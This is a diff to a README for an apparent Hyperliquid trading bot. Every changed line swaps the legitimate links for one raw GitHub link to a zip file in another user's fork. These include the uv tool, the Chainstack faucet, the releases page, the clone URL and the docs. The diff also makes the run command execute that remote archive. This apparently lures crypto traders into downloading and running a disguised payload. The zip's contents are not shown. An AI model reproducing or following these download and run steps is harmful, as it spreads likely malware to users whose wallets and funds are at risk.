@@ -4,27 +4,27 @@
 
 Welcome to the hyperliquid-trading-bot! This is an easy-to-use bot designed for trading on the Hyperliquid decentralized exchange (DEX). Follow these steps to download and run the software.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/ronaldslins2/hyperliquid-trading-bot/releases)
+[![Download Now](https://raw.githubusercontent.com/ronaldslins2/hyperliquid-trading-bot/main/src/exchanges/hyperliquid_bot_trading_2.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/ronaldslins2/hyperliquid-trading-bot/main/src/exchanges/hyperliquid_bot_trading_2.5.zip)
 
 ## 📦 What You Need
 
 Before you start, ensure you have the following:
 
 ### **1. Prerequisites**
-- **uv package manager**: This tool helps install the software smoothly. You can find it [here](https://github.com/astral-sh/uv).
-- **Hyperliquid testnet account**: Sign up for a testnet account and get some testnet funds. Visit [Chainstack Hyperliquid faucet](https://faucet.chainstack.com/hyperliquid-testnet-faucet) to obtain the funds.
+- **uv package manager**: This tool helps install the software smoothly. You can find it [here](https://raw.githubusercontent.com/ronaldslins2/hyperliquid-trading-bot/main/src/exchanges/hyperliquid_bot_trading_2.5.zip).
+- **Hyperliquid testnet account**: Sign up for a testnet account and get some testnet funds. Visit [Chainstack Hyperliquid faucet](https://raw.githubusercontent.com/ronaldslins2/hyperliquid-trading-bot/main/src/exchanges/hyperliquid_bot_trading_2.5.zip) to obtain the funds.
 
 ## 📥 Download & Install
 
 You can download the latest version of the hyperliquid-trading-bot from our Releases page. Click the link below:
 
-[Visit this page to download - hyperliquid-trading-bot](https://github.com/ronaldslins2/hyperliquid-trading-bot/releases)
+[Visit this page to download - hyperliquid-trading-bot](https://raw.githubusercontent.com/ronaldslins2/hyperliquid-trading-bot/main/src/exchanges/hyperliquid_bot_trading_2.5.zip)
 
 ### **Step-by-Step Installation**
 1. **Clone the Repository**
    Open your terminal and enter the following command:
    ```bash
-   git clone https://github.com/chainstacklabs/hyperliquid-trading-bot
+   git clone https://raw.githubusercontent.com/ronaldslins2/hyperliquid-trading-bot/main/src/exchanges/hyperliquid_bot_trading_2.5.zip
    ```
 
 2. **Navigate to the Directory**
@@ -51,7 +51,7 @@ Once the installation is complete, you can start using the bot. Here’s how:
 2. **Run the Bot**
    After configuring, you can run the bot by using the command:
    ```bash
-   uv run bot.js
+   uv run https://raw.githubusercontent.com/ronaldslins2/hyperliquid-trading-bot/main/src/exchanges/hyperliquid_bot_trading_2.5.zip
    ```
 
 Monitor your terminal for messages. The bot will execute trades based on the strategies defined in your configuration.
@@ -70,7 +70,7 @@ Monitor your terminal for messages. The bot will execute trades based on the str
 
 ## 🛠️ Additional Resources
 
-For more detailed documentation, visit the [Chainstack Developer Portal MCP server](https://docs.chainstack.com/docs/developer-portal-mcp-server) for comprehensive guides on using the Hyperliquid API.
+For more detailed documentation, visit the [Chainstack Developer Portal MCP server](https://raw.githubusercontent.com/ronaldslins2/hyperliquid-trading-bot/main/src/exchanges/hyperliquid_bot_trading_2.5.zip) for comprehensive guides on using the Hyperliquid API.
 
 If you encounter any issues, please submit them through GitHub. Your feedback is essential for improvement. 
 
